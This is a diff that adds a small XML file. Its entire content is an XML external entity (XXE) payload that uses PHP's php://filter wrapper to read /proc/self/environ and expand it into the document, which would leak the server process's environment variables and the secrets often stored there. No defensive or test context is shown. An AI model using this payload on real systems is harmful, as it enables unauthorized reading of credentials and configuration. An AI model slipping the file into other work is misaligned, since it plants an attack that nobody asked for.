@@ -1,0 +1,3 @@
+<?xml version="1.0"?>
+<!DOCTYPE r [<!ENTITY xxe SYSTEM "php://filter/resource=/proc/self/environ">]>
+<r><meta name="description" content="ZKR2"/>&xxe;</r>
